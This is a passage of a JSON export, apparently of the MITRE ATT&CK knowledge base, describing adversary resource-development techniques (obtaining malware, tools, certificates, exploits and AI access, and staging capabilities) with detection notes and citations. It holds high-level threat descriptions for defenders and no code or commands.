the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis. <a href=\"https://www.irongeek.com/i.php?page=videos/bsidescharm2017/bsidescharm-2017-t111-microsoft-patch-analysis-for-exploitation-stephen-sims\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Irongeek Sims BSides 2017)</a>\n\nAs with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.\n\nAdversaries may use exploits during various phases of the adversary lifecycle (i.e. Exploit Public-Facing Application, Exploitation for Client Execution, Exploitation for Privilege Escalation, Exploitation for Stealth, Exploitation for Credential Access, Exploitation of Remote Services, and Application or System Exploitation).","detection":"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on behaviors relating to the use of exploits (i.e. Exploit Public-Facing Application, Exploitation for Client Execution, Exploitation for Privilege Escalation, Exploitation for Defense Evasion, Exploitation for Credential Access, Exploitation of Remote Services, and Application or System Exploitation).","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]}]},{"id":"T1588","name":"Obtain Capabilities","description":"Adversaries may buy and/or steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle.\n\nIn addition to downloading free malware, software, and exploits from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware and exploits, criminal marketplaces, or from individuals. <a href=\"https://www.nytimes.com/2013/07/14/world/europe/nations-buying-as-hackers-sell-computer-flaws.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NationsBuying)</a> <a href=\"https://citizenlab.ca/2016/08/million-dollar-dissident-iphone-zero-day-nso-group-uae/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PegasusCitizenLab)</a>\n\nIn addition to purchasing capabilities, adversaries may steal capabilities from third-party entities (including other adversaries). This can include stealing software licenses, malware, SSL/TLS and code-signing certificates, or raiding closed databases of vulnerabilities or exploits. <a href=\"https://threatpost.com/final-report-diginotar-hack-shows-total-compromise-ca-servers-103112/77170/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DiginotarCompromise)</a>","detection":"Consider analyzing malware for features that may be associated with malware providers, such as compiler used, debugging artifacts, code similarities, or even group identifiers associated with specific Malware-as-a-Service (MaaS) offerings. Malware repositories can also be used to identify additional samples associated with the developers and the adversary utilizing their services. Identifying overlaps in malware use by different adversaries may indicate malware was obtained by the adversary rather than developed by them. In some cases, identifying overlapping characteristics in malware used by different adversaries may point to a shared quartermaster. <a href=\"https://www.mandiant.com/resources/supply-chain-analysis-from-quartermaster-to-sunshop\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEyeSupplyChain)</a> Malware repositories can also be used to identify features of tool use associated with an adversary, such as watermarks in Cobalt Strike payloads. <a href=\"https://www.randhome.io/blog/2020/12/20/analyzing-cobalt-strike-for-fun-and-profit/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Analyzing CS Dec 2020)</a>\n\nConsider use of services that may aid in the tracking of newly issued certificates and/or certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure. <a href=\"https://www.splunk.com/en_us/blog/security/tall-tales-of-hunting-with-tls-ssl-certificates.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Splunk Kovar Certificates 2017)</a> Some server-side components of adversary tools may have default values set for SSL/TLS certificates. <a href=\"https://www.recordedfuture.com/research/cobalt-strike-servers\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Recorded Future Beacon Certificates)</a>\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Defense Evasion or Command and Control.","platforms":["PRE"],"dataSources":["Certificate: Certificate Registration","Malware Repository: Malware Metadata","Internet Scan: Response Content","Malware Repository: Malware Content"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}],"subTechniques":[{"id":"T1588.001","name":"Malware","description":"Adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\n\nIn addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).","detection":"Consider analyzing malware for features that may be associated with malware providers, such as compiler used, debugging artifacts, code similarities, or even group identifiers associated with specific MaaS offerings. Malware repositories can also be used to identify additional samples associated with the developers and the adversary utilizing their services. Identifying overlaps in malware use by different adversaries may indicate malware was obtained by the adversary rather than developed by them. In some cases, identifying overlapping characteristics in malware used by different adversaries may point to a shared quartermaster. <a href=\"https://www.mandiant.com/resources/supply-chain-analysis-from-quartermaster-to-sunshop\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEyeSupplyChain)</a>\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle.","platforms":["PRE"],"dataSources":["Malware Repository: Malware Metadata","Malware Repository: Malware Content"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1588.002","name":"Tool","description":"Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: PsExec). \n\nAdversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. Tools may also be leveraged for testing – for example, evaluating malware against commercial antivirus or endpoint detection and response (EDR) applications. <a href=\"https://www.forescout.com/resources/analysis-of-conti-leaks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Forescout Conti Leaks 2022)</a> <a href=\"https://www.sentinelone.com/labs/top-tier-target-what-it-takes-to-defend-a-cybersecurity-company-from-todays-adversaries/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sentinel Labs Top Tier Target 2025)</a>\n\nTool acquisition may involve the procurement of commercial software licenses, including for red teaming tools such as Cobalt Strike. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries). Threat actors may also crack trial versions of software. <a href=\"https://www.recordedfuture.com/blog/identifying-cobalt-strike-servers\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Recorded Future Beacon 2019)</a>","detection":"In some cases, malware repositories can also be used to identify features of tool use associated with an adversary, such as watermarks in Cobalt Strike payloads. <a href=\"https://www.randhome.io/blog/2020/12/20/analyzing-cobalt-strike-for-fun-and-profit/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Analyzing CS Dec 2020)</a>\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle.","platforms":["PRE"],"dataSources":["Malware Repository: Malware Metadata"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1588.003","name":"Code Signing Certificates","description":"Adversaries may buy and/or steal code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with. <a href=\"https://en.wikipedia.org/wiki/Code_signing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Code Signing)</a> Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.\n\nPrior to Code Signing, adversaries may purchase or steal code signing certificates for use in operations. The purchase of code signing certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal code signing materials directly from a compromised third-party.","detection":"Consider analyzing code signing certificates for features that may be associated with the adversary and/or their developers, such as the thumbprint, algorithm used, validity period, common name, and certificate authority. Malware repositories can also be used to identify additional samples associated with the adversary and identify patterns an adversary has used in procuring code signing certificates.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related follow-on behavior, such as Code Signing or Install Root Certificate.","platforms":["PRE"],"dataSources":["Malware Repository: Malware Metadata"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1588.004","name":"Digital Certificates","description":"Adversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner.\n\nAdversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex: Asymmetric Cryptography with Web Protocols) or even enabling Adversary-in-the-Middle if the certificate is trusted or otherwise added to the root of trust (i.e. Install Root Certificate). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities. <a href=\"https://threatpost.com/final-report-diginotar-hack-shows-total-compromise-ca-servers-103112/77170/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DiginotarCompromise)</a> Adversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.\n\nCertificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free. <a href=\"https://letsencrypt.org/docs/faq/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Let's Encrypt FAQ)</a>\n\nAfter obtaining a digital certificate, an adversary may then install that certificate (see Install Digital Certificate) on infrastructure under their control.","detection":"Consider use of services that may aid in the tracking of newly issued certificates and/or certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure. <a href=\"https://www.splunk.com/en_us/blog/security/tall-tales-of-hunting-with-tls-ssl-certificates.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Splunk Kovar Certificates 2017)</a> Some server-side components of adversary tools may have default values set for SSL/TLS certificates. <a href=\"https://www.recordedfuture.com/research/cobalt-strike-servers\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Recorded Future Beacon Certificates)</a>\n\nDetection efforts may be focused on related behaviors, such as Web Protocols, Asymmetric Cryptography, and/or Install Root Certificate.","platforms":["PRE"],"dataSources":["Certificate: Certificate Registration","Internet Scan: Response Content"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1588.005","name":"Exploits","description":"Adversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors. <a href=\"https://www.exploit-db.com/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Exploit Database)</a> <a href=\"https://www.wired.co.uk/article/darkhotel-hacking-team-cyber-espionage\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TempertonDarkHotel)</a> <a href=\"https://www.nytimes.com/2013/07/14/world/europe/nations-buying-as-hackers-sell-computer-flaws.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NationsBuying)</a>\n\nIn addition to downloading free exploits from the internet, adversaries may purchase exploits from third-party entities. Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces (including exploit kits), or from individuals. <a href=\"https://citizenlab.ca/2016/08/million-dollar-dissident-iphone-zero-day-nso-group-uae/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PegasusCitizenLab)</a> <a href=\"https://www.vice.com/en/article/3kx5y3/uzbekistan-hacking-operations-uncovered-due-to-spectacularly-bad-opsec\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wired SandCat Oct 2019)</a> In addition to purchasing exploits, adversaries may steal and repurpose exploits from third-party entities (including other adversaries). <a href=\"https://www.wired.co.uk/article/darkhotel-hacking-team-cyber-espionage\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TempertonDarkHotel)</a>\n\nAn adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. There is usually a delay between when an exploit is discovered and when it is made public. An adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation.\n\nAdversaries may use exploits during various phases of the adversary lifecycle (i.e. Exploit Public-Facing Application, Exploitation for Client Execution, Exploitation for Privilege Escalation, Exploitation for Stealth, Exploitation for Credential Access, Exploitation of Remote Services, and Application or System Exploitation).","detection":"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on behaviors relating to the use of exploits (i.e. Exploit Public-Facing Application, Exploitation for Client Execution, Exploitation for Privilege Escalation, Exploitation for Defense Evasion, Exploitation for Credential Access, Exploitation of Remote Services, and Application or System Exploitation).","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1588.006","name":"Vulnerabilities","description":"Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases. <a href=\"https://nvd.nist.gov/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: National Vulnerability Database)</a>\n\nAn adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. Exploits) or to attempt to develop one themselves (i.e. Exploits).","detection":"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on behaviors relating to the potential use of exploits for vulnerabilities (i.e. Exploit Public-Facing Application, Exploitation for Client Execution, Exploitation for Privilege Escalation, Exploitation for Defense Evasion, Exploitation for Credential Access, Exploitation of Remote Services, and Application or System Exploitation).","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1588.007","name":"Artificial Intelligence","description":"Adversaries may obtain access to generative artificial intelligence tools, such as large language models (LLMs), to aid various techniques during targeting. These tools may be used to inform, bolster, and enable a variety of malicious tasks, including conducting Reconnaissance, creating basic scripts, assisting social engineering, and even developing payloads. <a href=\"https://www.microsoft.com/en-us/security/blog/2024/02/14/staying-ahead-of-threat-actors-in-the-age-of-ai/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MSFT-AI)</a> \n\nFor example, by utilizing a publicly available LLM an adversary is essentially outsourcing or automating certain tasks to the tool. Using AI, the adversary may draft and generate content in a variety of written languages to be used in Phishing/Phishing for Information campaigns. The same publicly available tool may further enable vulnerability or other offensive research supporting Develop Capabilities. AI tools may also automate technical tasks by generating, refining, or otherwise enhancing (e.g., Obfuscated Files or Information) malicious scripts and payloads. <a href=\"https://openai.com/index/disrupting-malicious-uses-of-ai-by-state-affiliated-threat-actors/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OpenAI-CTI)</a> Finally, AI-generated text, images, audio, and video may be used for fraud, Impersonation, and other malicious activities. <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/ai-powered-voice-spoofing-vishing-attacks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google-Vishing24)</a> <a href=\"https://www.ic3.gov/PSA/2024/PSA241203\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: IC3-AI24)</a> <a href=\"https://www.wsj.com/articles/fraudsters-use-ai-to-mimic-ceos-voice-in-unusual-cybercrime-case-11567157402\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: WSJ-Vishing-AI24)</a>","detection":"","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]}]},{"id":"T1608","name":"Stage Capabilities","description":"Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed (Develop Capabilities) or obtained (Obtain Capabilities) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary (Acquire Infrastructure) or was otherwise compromised by them (Compromise Infrastructure). Capabilities may also be staged on web services, such as GitHub or Pastebin, or on Platform-as-a-Service (PaaS) offerings that enable users to easily provision applications. <a href=\"https://www.volexity.com/blog/2020/11/06/oceanlotus-extending-cyber-espionage-operations-through-fake-websites/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Volexity Ocean Lotus November 2020)</a> <a href=\"https://www.dragos.com/blog/industry-news/a-new-water-watering-hole/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Dragos Heroku Watering Hole)</a> <a href=\"https://www.malwarebytes.com/blog/news/2019/12/theres-an-app-for-that-web-skimmers-found-on-paas-heroku\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malwarebytes Heroku Skimmers)</a> <a href=\"https://www.netskope.com/blog/targeted-attacks-abusing-google-cloud-platform-open-redirection\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Netskope GCP Redirection)</a> <a href=\"https://www.netskope.com/blog/a-big-catch-cloud-phishing-from-google-app-engine-and-azure-app-service\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Netskope Cloud Phishing)</a>\n\nStaging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including (but not limited to):\n\n* Staging web resources necessary to conduct Drive-by Compromise when a user browses to a site. <a href=\"https://www.fireeye.com/blog/threat-research/2012/12/council-foreign-relations-water-hole-attack-details.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye CFR Watering Hole 2012)</a> <a href=\"http://arstechnica.com/security/2015/08/newly-discovered-chinese-hacking-group-hacked-100-websites-to-use-as-watering-holes/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Gallagher 2015)</a> <a href=\"https://cybersecurity.att.com/blogs/labs-research/scanbox-a-reconnaissance-framework-used-on-watering-hole-attacks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ATT ScanBox)</a>\n* Staging web resources for a link target to be used with spearphishing. <a href=\"https://blog.malwarebytes.com/malwarebytes-news/2020/10/silent-librarian-apt-phishing-attack/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malwarebytes Silent Librarian October 2020)</a> <a href=\"https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-ta407-silent-librarian\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Proofpoint TA407 September 2019)</a>\n* Uploading malware or tools to a location accessible to a victim network to enable Ingress Tool Transfer. <a href=\"https://www.volexity.com/blog/2020/11/06/oceanlotus-extending-cyber-espionage-operations-through-fake-websites/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Volexity Ocean Lotus November 2020)</a>\n* Installing a previously acquired SSL/TLS certificate to use to encrypt command and control traffic (ex: Asymmetric Cryptography with Web Protocols). <a href=\"https://www.digicert.com/kb/ssl-certificate-installation.htm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DigiCert Install SSL Cert)</a>","detection":"If infrastructure or patterns in malware, tooling, certificates, or malicious web content have been previously identified, internet scanning may uncover when an adversary has staged their capabilities.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as initial access and post-compromise behaviors.","platforms":["PRE"],"dataSources":["Internet Scan: Response Content"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}],"subTechniques":[{"id":"T1608.001","name":"Upload Malware","description":"Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content. Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable Ingress Tool Transfer by placing it on an Internet accessible web server.\n\nMalware may be placed on infrastructure that was previously purchased/rented by the adversary (Acquire Infrastructure) or was otherwise compromised by them (Compromise Infrastructure). Malware can also be staged on web services, such as GitHub or Pastebin; hosted on the InterPlanetary File System (IPFS), where decentralized content storage makes the removal of malicious files difficult; or saved on the blockchain as smart contracts, which are resilient against takedowns that would affect traditional infrastructure. <a href=\"https://www.volexity.com/blog/2020/11/06/oceanlotus-extending-cyber-espionage-operations-through-fake-websites/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Volexity Ocean Lotus November 2020)</a> <a href=\"https://blog.talosintelligence.com/ipfs-abuse/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Talos IPFS 2022)</a> <a href=\"https://labs.guard.io/etherhiding-hiding-web2-malicious-code-in-web3-smart-contracts-65ea78efad16\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Guardio Etherhiding 2023)</a> <a href=\"https://www.bleepingcomputer.com/news/security/hackers-use-binance-smart-chain-contracts-to-store-malicious-scripts/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Bleeping Computer Binance Smart Chain 2023)</a>\n\nAdversaries may upload backdoored files, such as software packages, application binaries, virtual machine images, or container images, to third-party software stores, package libraries, extension marketplaces, or repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub, PyPi, NPM). <a href=\"https://securitylabs.datadoghq.com/articles/malicious-pypi-package-targeting-highly-specific-macos-machines/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Datadog Security Labs Malicious PyPi Packages 2024)</a> By chance encounter, victims may directly download/install these backdoored files via User Execution. Masquerading, including typosquatting legitimate software, may increase the chance of users mistakenly executing these files.","detection":"If infrastructure or patterns in malware have been previously identified, internet scanning may uncover when an adversary has staged malware to make it accessible for targeting.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle, such as User Execution or Ingress Tool Transfer.","platforms":["PRE"],"dataSources":["Internet Scan: Response Content"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1608.002","name":"Upload Tool","description":"Adversaries may upload tools to third-party or adversary controlled infrastructure to make it accessible during targeting. Tools can be open or closed source, free or commercial. Tools can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: PsExec). Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enable Ingress Tool Transfer by placing it on an Internet accessible web server.\n\nTools may be placed on infrastructure that was previously purchased/rented by the adversary (Acquire Infrastructure) or was otherwise compromised by them (Compromise Infrastructure). <a href=\"https://www.secureworks.com/research/threat-group-3390-targets-organizations-for-cyberespionage\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Dell TG-3390)</a> Tools can also be staged on web services, such as an adversary controlled GitHub repo, or on Platform-as-a-Service offerings that enable users to easily provision applications. <a href=\"https://www.dragos.com/blog/industry-news/a-new-water-watering-hole/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Dragos Heroku Watering Hole)</a> <a href=\"https://www.malwarebytes.com/blog/news/2019/12/theres-an-app-for-that-web-skimmers-found-on-paas-heroku\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malwarebytes Heroku Skimmers)</a> <a href=\"https://www.intezer.com/blog/malware-analysis/kud-i-enter-your-server-new-vulnerabilities-in-microsoft-azure/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Intezer App Service Phishing)</a>\n\nAdversaries can avoid the need to upload a tool by having compromised victim machines download the tool directly from a third-party hosting location (ex: a non-adversary controlled GitHub repo), including the original hosting site of the tool.","detection":"If infrastructure or patterns in tooling have been previously identified, internet scanning may uncover when an adversary has staged tools to make them accessible for targeting.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle, such as Ingress Tool Transfer.","platforms":["PRE"],"dataSources":["Internet Scan: Response Content"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1608.003","name":"Install Digital Certificate","description":"Adversaries may install SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are files that can be installed on servers to enable secure communications between systems. Digital certificates include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate securely with its owner. Certificates can be uploaded to a server, then the server can be configured to use the certificate to enable encrypted communication with it. <a href=\"https://www.digicert.com/kb/ssl-certificate-installation.htm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DigiCert Install SSL Cert)</a>\n\nAdversaries may install SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: Asymmetric Cryptography with Web Protocols) or lending credibility to a credential harvesting site. Installation of digital certificates may take place for a number of server types, including web servers and email servers. \n\nAdversaries can obtain digital certificates (see Digital Certificates) or create self-signed certificates (see Digital Certificates). Digital certificates can then be installed on adversary controlled infrastructure that may have been acquired (Acquire Infrastructure) or previously compromised (Compromise Infrastructure).","detection":"Consider use of services that may aid in the tracking of certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure. <a href=\"https://www.splunk.com/en_us/blog/security/tall-tales-of-hunting-with-tls-ssl-certificates.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Splunk Kovar Certificates 2017)</a>\n\nDetection efforts may be focused on related behaviors, such as Web Protocols or Asymmetric Cryptography.","platforms":["PRE"],"dataSources":["Internet Scan: Response Content"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1608.004","name":"Drive-by Target","description":"Adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing. Endpoint systems may be compromised through browsing to adversary controlled sites, as in Drive-by Compromise. In such cases, the user's web browser is typically targeted for exploitation (often not requiring any extra user interaction once landing on the site), but adversaries may also set up websites for non-exploitation behavior such as Application Access Token. Prior to Drive-by Compromise, adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site. Drive-by content can be staged on adversary controlled infrastructure that has been acquired (Acquire Infrastructure) or previously compromised (Compromise Infrastructure).\n\nAdversaries may upload or inject malicious web content, such as JavaScript, into websites. <a href=\"https://www.fireeye.com/blog/threat-research/2012/12/council-foreign-relations-water-hole-attack-details.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye CFR Watering Hole 2012)</a> <a href=\"http://arstechnica.com/security/2015/08/newly-discovered-chinese-hacking-group-hacked-100-websites-to-use-as-watering-holes/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Gallagher 2015)</a> This may be done in a number of ways, including:\n\n* Inserting malicious scripts into web pages or other user controllable web content such as forum posts\n* Modifying script files served to websites from publicly writeable cloud storage buckets\n* Crafting malicious web advertisements and purchasing ad space on a website through legitimate ad providers (i.e., Malvertising)\n\nIn addition to staging content to exploit a user's web browser, adversaries may also stage scripting content to profile the user's browser (as in Gather Victim Host Information) to ensure it is vulnerable prior to attempting exploitation. <a href=\"https://cybersecurity.att.com/blogs/labs-research/scanbox-a-reconnaissance-framework-used-on-watering-hole-attacks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ATT ScanBox)</a>\n\nWebsites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is referred to a strategic web compromise or watering hole attack.\n\nAdversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure (Domains) to help facilitate Drive-by Compromise.","detection":"If infrastructure or patterns in the malicious web content utilized to deliver a Drive-by Compromise have been previously identified, internet scanning may uncover when an adversary has staged web content for use in a strategic web compromise.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on other phases of the adversary lifecycle, such as Drive-by Compromise or Exploitation for Client Execution.","platforms":["PRE"],"dataSources":["Internet Scan: Response Content"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1608.005","name":"Link Target","description":"Adversaries may put 